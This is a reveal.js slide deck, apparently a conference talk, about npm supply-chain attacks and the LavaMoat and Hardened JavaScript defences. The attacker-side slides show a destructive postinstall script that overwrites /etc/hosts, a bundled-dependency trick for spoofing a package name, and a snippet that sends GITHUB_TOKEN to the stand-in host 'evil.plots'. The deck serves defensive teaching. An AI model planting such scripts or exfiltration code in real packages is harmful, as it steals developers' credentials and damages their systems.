@@ -1,0 +1,914 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+
+  <title>LavaMoat</title>
+
+  <meta name="author" content="naugtur">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reset.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/theme/black.css" id="theme">
+
+  <!-- Theme used for syntax highlighting of code -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/zenburn.css">
+
+
+  <link rel="stylesheet" href="../branding/style4x.css" id="branding">
+  <style>
+    #naugtur.reveal .muchcode pre>code {
+      max-height: 90vh;
+      min-width: 70vw;
+      font-size: 0.88em;
+    }
+
+    #naugtur:before {
+      content: 'naugtur.pl';
+      position: fixed;
+      bottom: .5em;
+      left: .5em;
+      font-size: .8em;
+      animation-name: spin;
+      animation-timing-function: linear;
+      animation-iteration-count: infinite;
+      animation-duration: 30s;
+      transform-style: preserve-3d;
+      transform: rotateX(0.5deg);
+      transform-origin: 50% 50%;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotateX(0deg);
+      }
+
+      3% {
+        transform: rotateX(-360deg);
+      }
+
+      100% {
+        transform: rotateX(-360deg);
+      }
+    }
+
+    .boxes {
+      width: 70vw;
+      height: 70vh;
+      font-size: 5vh;
+
+    }
+
+    .boxes div {
+      box-sizing: border-box;
+      width: 46%;
+      height: 44%;
+      float: left;
+      border: 3px solid #3c873a;
+      margin: 2%;
+      text-align: center;
+      font-size: 0.7em;
+      line-height: 2em;
+      padding: 2%;
+    }
+
+
+    .an-container {
+      width: 100%;
+      height: 550px;
+
+    }
+
+    .an-item,
+    .an-start-loc {
+      position: fixed;
+      top: 15%;
+      left: 15%;
+    }
+
+    .an-y {
+      z-index: 11;
+      max-height: none !important;
+    }
+
+    .an-target {
+      position: fixed;
+      top: 326px;
+      right: 8%;
+      width: 40%;
+      z-index: 0;
+
+    }
+
+    .reveal section img.clear {
+      border: none;
+      background: none;
+      box-shadow: none;
+      max-width: 50%;
+    }
+
+    .an-item {
+      offset-path: path('M100,80 C200,-200 500,0 600,300');
+      offset-rotate: 0deg;
+    }
+
+    .an-item.an-to {
+      animation: move 4444ms infinite ease-in-out;
+    }
+
+    .an-item.an-oops {
+      background-color: rgba(255, 166, 60, 0.9);
+
+      /* animation-play-state: paused !important; */
+      border-radius: 50%;
+      /* offset-path: path('M30,80 C200,-200 500,0 320,200'); */
+      animation: discover 4444ms ease-in-out;
+      animation-fill-mode: forwards;
+      z-index: 10;
+
+    }
+
+    @keyframes move {
+      0% {
+        offset-distance: 0%;
+      }
+
+      100% {
+        offset-distance: 100%;
+      }
+    }
+
+    #naugtur .moji h1 {
+      line-height: 3em;
+    }
+
+    sub>sup,
+    sup>sub {
+      color: #777;
+    }
+
+    #naugtur .dense {
+      li {
+        font-size: 0.7em;
+        line-height: 1.2em;
+      }
+
+      p>a {
+        font-size: 0.5em;
+      }
+
+      blockquote {
+        margin: 1em auto;
+        padding: 0em 0.5em;
+      }
+
+    }
+
+    #naugtur .whitehat .slide-background-content {
+      background: url('./ilus/dev.png') no-repeat top right / 20%;
+    }
+
+    #naugtur .blackhat .slide-background-content {
+      background: url('./ilus/hacker.png') no-repeat bottom right / 35%;
+    }
+
+    #naugtur .blackhat pre.code-wrapper {
+      width: 75%;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="reveal none" id="naugtur">
+
+    <div class="slides">
+      <!-- <section> -->
+
+      <section>
+        <br><br>
+        <h1></h1>
+        <br>
+        <h4>LavaMoat & Kipuka</h4>
+        <small>@naugtur, 2025</small>
+      </section>
+
+      <section>
+        <h3>
+          Who's that guy?
+        </h3>
+
+        <img src="../../me.avatar.jpg" height="100px">
+        <img src="./ilus/js.svg" height="100px">
+        <img src="../../mjs.svg" height="100px">
+        <img src="./ilus/lm.png" height="100px">
+        <img src="./ilus/mm.svg" height="100px">
+
+
+      </section>
+
+      <section data-markdown>
+        <textarea>
+#### I was into JS security <br>before I knew JS<br>or security
+
+```js
+function kill(){
+  setTimeout('kill',0)
+  setTimeout('kill',0)
+}
+kill()
+```
+
+<sub><sup>first 5 lines of JS I've written break Windows 98 up to XP before SP2</sup></sub>
+          </textarea>
+      </section>
+
+      <section data-background-video="./ilus/dark.mp4" data-background-video-loop>
+        <h4>in the shadows of </h4>
+        <img src="./npm.svg" />
+
+      </section>
+
+      <section class="dense" data-markdown>
+        <textarea data-template>
+
+#### Qix Account Compromise <br>(September 2025)
+
+- A prolific npm maintainer "Qix" was compromised via a sophisticated 2FA phishing email, leading to malicious versions of foundational JavaScript packages.
+- **Delivery Method**: Slightly obfuscated code injected in legitimate package code monkey-patching request methods
+- **Target**: End users with connected crypto wallets visiting applications using the compromised packages had their transactions destination addresses replaced with attacker-controlled addresses
+
+[Socket.dev -  npm Author Qix Compromised via Phishing Email](https://socket.dev/blog/npm-author-qix-compromised-in-major-supply-chain-attack)
+
+---
+
+### 2 🅱️ilion downloads
+#### 500 $ stolen 🤣
+
+<br><br>
+
+> LavaMoat defeats it, but that's offtopic today
+> https://github.com/naugtur/running-qix-malware/
+
+---
+
+
+#### Shai-Hulud Worm <br>(September 2025)
+
+- A ~~first~~[second](https://naugtur.pl/pres3/npmsec/#/5)-of-its-[kind](https://kb.cert.org/static-bigvince-prod-kb-eb/vincepub/files/319816_attach_npmwormdisclosure.pdf) self-replicating worm that automatically propagates across npm packages and GitHub repositories.
+- **Outcome**: Stealing secrets, cloud tokens, and making private repositories public; establishing persistent backdoors
+- **Delivery Method**: Postinstall scripts that harvest credentials and automatically republish other packages with malicious code
+- **Target**: Developer machines, CI environments, and GitHub repositories
+
+[Zscaler - Mitigating Risks from the Shai-Hulud NPM Worm](https://www.zscaler.com/blogs/security-research/mitigating-risks-shai-hulud-npm-worm)
+
+---
+
+
+#### Skuld Infostealer Campaign <br>(December 2024)
+
+- Malicious packages disguised as Windows utilities and Solara tools targeting the npm ecosystem with commodity malware.
+- **Outcome**: Stealing credentials, passwords, cookies, and sensitive files from browsers and applications
+- **Delivery Method**: Typosquatted packages using postinstall scripts to download and execute malware
+- **Target**: Developer machines, particularly targeting credential theft and system reconnaissance
+
+[Socket.dev - Skuld Infostealer Returns to npm with Fake Windows Utilities](https://socket.dev/blog/skuld-infostealer-returns-to-npm)
+
+---
+
+
+#### SSH Backdoor Campaign <br>(November 2024)
+
+- Six malicious packages typosquatting popular libraries to inject SSH backdoors into Linux systems.
+- **Delivery Method**: Postinstall scripts that add attacker's SSH public key to authorized_keys file on Linux systems
+- **Target**: Linux developer machines and servers, establishing persistent remote access
+
+[The Hacker News - Malicious npm Packages Target Developers' Ethereum Private Keys](https://thehackernews.com/2024/10/malicious-npm-packages-target.html)
+
+---
+
+
+#### Toptal GitHub Hijack <br>(July 2025)
+
+- Stealing GitHub authentication tokens and attempting to destroy entire file systems
+- **Delivery Method**: hreat actors hijacked Toptal's GitHub organization, making 73 repositories public and publishing malicious packages with destructive preinstall and postinstall scripts
+- **Target**: Developer machines and GitHub credentials
+
+[The Register - Toptal caught serving malware after GitHub compromise](https://www.theregister.com/2025/07/25/toptal_malware_attack/)
+
+---
+
+
+#### Contagious Interview Campaign <br>(2024-2025)
+
+- *Long-running North Korean campaign using fake job interviews and coding challenges to distribute malware through npm packages.
+- **Outcome**: Stealing cryptocurrency wallet keys, browser credentials, and establishing backdoors for espionage
+- **Delivery Method**: Social engineering developers to install malicious packages disguised as coding assignments; packages use XORIndex and HexEval loaders
+- **Target**: Cryptocurrency developers, job seekers, and individuals with valuable credentials or assets
+
+[The Hacker News - North Korean Hackers Flood npm Registry with XORIndex Malware](https://thehackernews.com/2025/07/north-korean-hackers-flood-npm-registry.html)
+
+---
+
+
+#### Rspack/Vant Cryptomining Attack <br>(December 2024)
+
+- Popular JavaScript bundler Rspack and Vue.js UI library Vant compromised to distribute XMRig cryptocurrency mining malware.
+- **Delivery Method**: Compromised npm publishing tokens used to inject malicious postinstall scripts
+- **Target**: Developer machines with sufficient computational resources for cryptocurrency mining
+
+[The Hacker News - Rspack npm Packages Compromised with Crypto Mining Malware](https://thehackernews.com/2024/12/rspack-npm-packages-compromised-with.html)
+
+---
+
+
+#### Ledger Connect Kit Attack <br>(December 2023)
+
+- Cryptocurrency theft through transaction hijacking, with over \$600,000 stolen during the attack window
+- **Delivery Method**: Former Ledger employee fell victim to phishing attack, leading to compromised npm account publishing malicious versions of legitimate crypto wallet integration library
+- **Target**: DApp users and developers using Ledger wallet connections
+
+[The Hacker News - Crypto Hardware Wallet Ledger's Supply Chain Breach Drains \$600,000 in Crypto](https://thehackernews.com/2023/12/crypto-hardware-wallet-ledgers-supply.html)
+
+---
+
+
+#### Discord Token Stealer Campaigns <br>(2022-ongoing)
+
+- Hijacking Discord accounts and stealing session credentials
+- **Delivery Method**: Tyrosquatted packages scanning browser storage and Discord directories for tokens
+- **Target**: Discord users and developers, particularly those with valuable Discord accounts or communities
+
+[Infosecurity Magazine - Malicious Npm Packages Designed to Steal Discord Tokens](https://www.infosecurity-magazine.com/news/malicious-npm-packages-steal/)
+
+ </textarea>
+
+      </section>
+      <section data-markdown>
+        <textarea data-template>
+
+#### more
+##### [socket.dev/blog](https://socket.dev/blog/)
+
+---
+
+### What's my point with all the FUD?
+        </textarea>
+
+      </section>
+
+
+      </section>
+
+      <section data-background-video="./ilus/dark.mp4">
+        <h3>Don't go alone</h3>
+      </section>
+
+
+      <!-- <section class="animatedSlide bad">
+
+        <img src="./npm.svg" alt="npm logo" style="width: 25%; margin-top:5%" class=" an-y an-start-loc">
+        <img src="./ilus/cookie.png" alt="gobble" class="an-target an-y">
+        <div class="an-container"></div>
+
+        <br><br>
+        <sub><sup>
+            What if not all packages are _great_ ?
+          </sup></sub>
+
+      </section> -->
+
+      <section data-markdown>
+        <textarea data-template>
+            ### Software architectures rely on
+            
+            # 🤞
+            ## intention alignment
+
+            <br><br>
+
+            All code serves the common goal of the app working
+
+            ---
+
+            ### Code authors in your app:
+
+            🙋 you, the team (few)  
+            🧑‍🤝‍🧑 other teams (more)  
+            🧙 pkg authors (many)  
+            🤖 AI agents (many?)  
+            
+            ---
+
+            # 🤯
+            ## Intention alignment is a myth
+            
+            ---
+            
+            ### 🧠🔨
+            - Authors publish malicious packages
+            - Devs write buggy code
+            - Bugfix in one corner breaks another corner
+            - Teams work under different constraints and OKRs
+
+            - Hallucinated package names - [Slopsquatting](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks)
+            - AI code messing up shared resources
+            - LLMs regurgitating old vulnerabilities           
+
+            ---
+
+            ### I hear alignment is<br>a hard problem with humans too 😉
+
+
+            - Tradition
+            - Law
+            - Separation of powers (in gov)<br>**In software:**
+            - Conway's law
+            - Microservices
+            - Error boundaries
+
+            ---
+
+            # Fearless cooperation
+            # 🦸
+
+            ---
+
+            ### Fearless cooperation
+
+            We need tools and architectures that let software cooperate without authors necessarily trusting each other.
+
+            ---
+
+            #### There has been serious research
+            [Listen to Mark S. Miller for more](https://foresight.org/summary/mark-s-miller-agoric-computational-markets-agoric-systems/)
+
+            ---
+
+            ### I'm here to tell you about fearless cooperation tools
+            # 🧰
+
+          </textarea>
+      </section>
+
+
+      <section data-markdown data-background="#235">
+        ## Story time
+      </section>
+
+
+      <section class="whitehat">
+        <h3> Let's install some dependencies! </h3>
+      </section>
+      <section class="blackhat">
+        <h3> Ok, catch this: 📦 </h3>
+      </section>
+
+      <section class="whitehat">
+        <h4> I'm not runing that. </h4>
+      </section>
+      <section class="blackhat">
+        <h4> That's what you think. </h4>
+        <img src="ilus/npmscripts.png" alt="npm docs for lifecycle scripts" class="clear">
+        <pre><code data-trim>
+            "postinstall": "echo 💩 > /etc/hosts"
+        </code></pre>
+      </section>
+
+      <section data-markdown class="whitehat">
+        ### Ok, wait
+        ```
+        ✨🐋
+        npm ci
+        cp node_modules s3://
+        🔥🔥🐋🔥🔥
+        ```
+      </section>
+
+      <section class="blackhat">
+        <h3>Hold my 🍺 </h3>
+        <pre><code  data-line-numbers="6|8|10" language="text">
+├─app.ts
+├─node_modules
+│ ├─@naugtur
+│ │ └─evilpackage
+| │   ├─evilPlots.js --,
+| │   └─package.json   |
+│ └─typescript         💩
+│   ├─lib              |
+│   | └─tsc.js <-------'
+│   └─package.json
+└─package.json
+        </pre></code>
+      </section>
+
+      <section data-markdown class="whitehat">
+        ## ignore scripts
+
+        ```
+        npm ci --ignore-scripts
+        ```
+
+        Run selected scritps
+        ```
+        npm rebuild bcrypt
+        ```
+      </section>
+
+      <section data-markdown class="blackhat">
+        <textarea>
+#### I can spoof that package name
+  
+```
+evilpackage/node_modules/bcrypt/package.json:
+  "scripts": {
+    "postinstall": "echo 💩 > /etc/hosts"
+    
+evilpackage/package.json:
+  "bundledDependencies": ["bcrypt"]
+
+$ npm publish
+```
+        </textarea>
+      </section>
+
+      <section data-markdown class="whitehat">
+        # Oh 💩
+      </section>
+      <section data-markdown class="whitehat">
+        #### look what I found!
+        ![lavamoat](./lavamoat-logo.png)
+      </section>
+      <section data-markdown class="whitehat">
+        <textarea>
+#### @lavamoat/allow-scripts
+
+```
+$ allow-scripts setup
+$ allow-scripts auto
+```
+
+```
+.npmrc:
+  ignore-scripts=true
+
+package.json:
+  "lavamoat": {
+    "allowScripts": {
+      "@lavamoat/preinstall-always-fail": false,
+      "@naugtur/malicious": false
+    }
+  }
+```
+
+---
+
+#### for added convenience
+
+```
+package.json:
+  "scripts": {
+    "safeinstall": "npm ci && allow-scripts",
+``` 
+        </textarea>
+      </section>
+
+      <section data-background="#235">
+        <h4>And in that moment <br>the installation process was protected</h4>
+
+        <br><br>
+
+        You can do that too in 5 minutes or less
+      </section>
+
+      <section data-markdown class="blackhat">
+        #### let's get serious
+
+        > Dear ${ eslintPluginMaintainer },
+        > I understand you're busy and I'd be happy to help with maintenance of your
+        tiny but popular plugin...
+
+
+
+        (Or find a common hallucination to slopsquat)
+
+      </section>
+      <section data-markdown class="blackhat">
+        <textarea>
+#### will you read entire node_modules?
+
+```
+const credentials = process.env["GITHUB_TOKEN"];
+const req = require('https').request({
+  hostname: 'evil.plots',
+  path: `/stolen/${credentials}`,
+}, ()=>{});
+req.end();
+```
+          
+        </textarea>
+      </section>
+      <section data-markdown class="blackhat">
+        #### ok, just in case you do
+
+        ![](./ilus/obfuscated.png)
+
+      </section>
+
+      <section data-markdown class="whitehat">
+        #### yo, there's an app for that!
+
+        ![lavamoat](./lavamoat-logo.png)
+
+      </section>
+
+      <section data-markdown class="whitehat">
+        <textarea>
+#### it protects me at runtime
+
+```
+package.json:
+  "scripts": {
+    "generate-policy": "lavamoat build.js --autopolicy",
+    "build": "lavamoat build.js",
+```
+
+---
+
+#### policy file
+          
+```js
+./lavamoat/node/policy.json:
+  "that-eslint-plugin>evilpackage": {
+    "builtin": {
+      "https.request": true
+    },
+    "globals": {
+      "process.env": true
+    },
+
+```
+
+---
+
+#### policy override file
+          
+```js
+./lavamoat/node/policy-override.json:
+  "that-eslint-plugin>evilpackage": {
+    "builtin": {
+      "https": false
+    },
+    "globals": {
+      "process": false
+    },
+
+```
+        
+---
+
+```
+$ npm run build
+```
+```
+Error: LavaMoat - required node builtin package not in 
+allowlist: package "evilpackage" requested "https"
+
+TypeError: Cannot read properties of undefined 
+ (reading 'env')
+```
+        </textarea>
+      </section>
+
+
+
+      <section data-markdown \>
+        # how ?!
+
+        ![](./ilus/hacker3.png)
+      </section>
+
+      <section data-markdown data-background="#235">
+        ### what's inside?
+
+        ![lavamoat](./lavamoat-underthe.png)
+
+      </section>
+
+
+      <section data-markdown>
+        <textarea data-template>
+### What LavaMoat does <br>at runtime?
+
+- Runs every package in a separate _Compartment_
+- Uses a policy to choose what to allow in each
+- Destroys all globals on the outside
+
+---
+
+![](./hardenedjs.svg)
+
+## Hardened Javascript
+
+Provides a secure environment for running code.
+
+---
+
+### Ingredients
+
+- `Compartment` - scope isolation
+- `lockdown` - makes your Realm secure
+- `harden` - protects capable objects
+
+---
+
+# 🤯
+### JS design is good for security?
+
+- Take ECMA + W3C
+- Add Conway's Law
+- Separation between language and APIs
+- Power only reachable through scope
+- Compartment controls scope
+- Hardened JavaScript ✅
+
+---
+
+  ## Part of the language!
+  #### ( eventually )
+
+  https://github.com/tc39/proposal-compartments
+  
+---
+
+### Available as a shim
+
+![](./ilus/ses.png)
+
+---
+
+### Object Capability
+
+vs identity based security
+
+- code gets references to capable objects
+- code doesn't "work on your behalf"
+
+<br><br>
+OCap is a security model that enables <br>Fearless Cooperation.
+
+---
+
+### Object Capability
+
+You already know how to use it
+
+```js
+import { lint } from 'some-linter'
+import { readFile } from 'node:fs/promises'
+
+const fs = { readFile }
+
+lint({ fs })
+```
+
+---
+
+### Ok, that was a lot.
+
+- Install time protections with `allow-scripts`.
+- Runtime protections with policy,
+  - for node.js and bundlers (webpack plugin)
+  - using Hardened JavaScript and OCap
+
+LavaMoat is protecting installation, build and runtime of MetaMask - with up to 30 million users
+
+---
+
+https://lavamoat.github.io
+
+![lavamoat](./lavamoat-logo.png)
+
+Your adoption and feedback will help us start the <br>era of Fearless Cooperation.
+            </textarea>
+      </section>
+      <section>
+
+        <section>
+          <h4> I'll help you set up LavaMoat in your project</h4>
+
+          <img src="naugtur.svg" style="height:6em" />
+
+          <p>@naugtur &nbsp; <a href="https://naugtur.pl/">naugtur.pl</a></p>
+          <p> <a href="https://naugtur.pl/training">naugtur.pl/training</a></p>
+
+
+        </section>
+
+        <section>
+          <h4>attribution</h4>
+          <a href="https://www.vecteezy.com/free-videos/haunted-forest">Haunted Forest Stock Videos by
+            Vecteezy</a>
+        </section>
+      </section>
+
+
+    </div>
+
+  </div>
+
+  <style>
+    #naugtur {
+      background-image: none;
+    }
+
+    /*effectively switch from contain to cover behav*/
+    #naugtur .slide-background video {
+      min-width: 100%;
+      min-height: 100%;
+      width: auto;
+      height: auto;
+    }
+  </style>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/reveal.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/zoom/zoom.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/notes/notes.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/search/search.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/markdown/markdown.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.3.1/plugin/highlight/highlight.js"></script>
+
+
+  <script>
+    // Full list of configuration options available at:
+    // https://github.com/hakimel/reveal.js#configuration
+    Reveal.initialize({
+      controls: true,
+      progress: true,
+      history: true,
+      center: true,
+      mouseWheel: true,
+
+      transition: 'concave', // none/fade/slide/convex/concave/zoom
+
+      plugins: [RevealZoom, RevealNotes, RevealSearch, RevealMarkdown, RevealHighlight],
+      // autoAnimateEasing: 'linear',
+
+      // Parallax background image
+      // parallaxBackgroundImage: '../branding/bk.jpg', // e.g. "https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg"
+      //
+      // // Parallax background size
+      // parallaxBackgroundSize: '1920px 880px', // CSS syntax, e.g. "2100px 900px" - currently only pixels are supported (don't use % or auto)
+
+
+    });
+
+    function installAnimation(an, icon, delay) {
+      var el = document.createElement('span');
+      el.classList.add('an-item');
+      el.innerHTML = icon;
+      an.appendChild(el)
+      setTimeout(() => el.classList.add('an-to'), delay);
+      return el
+    }
+    Reveal.addEventListener('slidechanged', (event) => {
+      console.log(event.currentSlide)
+      if (event.currentSlide.classList.contains('animatedSlide')) {
+        var an = event.currentSlide.querySelector('.an-container');
+        an.innerHTML = '';
+        var pkgs = '📦,'.repeat(30).split(',')
+        if (event.currentSlide.classList.contains('bad')) {
+          pkgs[4] = '💣';
+          pkgs[10] = '🔥';
+          pkgs[27] = '👿';
+        }
+        pkgs.forEach((icon, index) =>
+          installAnimation(an, icon, 7777 * Math.log10((index) / 3 + 1))
+        )
+      }
+
+      if (event.currentSlide.classList.contains('animatedDependency')) {
+        const dep = document.querySelector('.adependency');
+        const deps = document.querySelector('.dependencies');
+        deps.innerHTML = '';
+        ' '.repeat(8).split('').forEach((_, index) => {
+          setTimeout(() => {
+            deps.appendChild(dep.cloneNode(true));
+          }, (index + 3) * 1000)
+        })
+      }
+    })
+
+
+  </script>
+
+</body>
+
+</html>
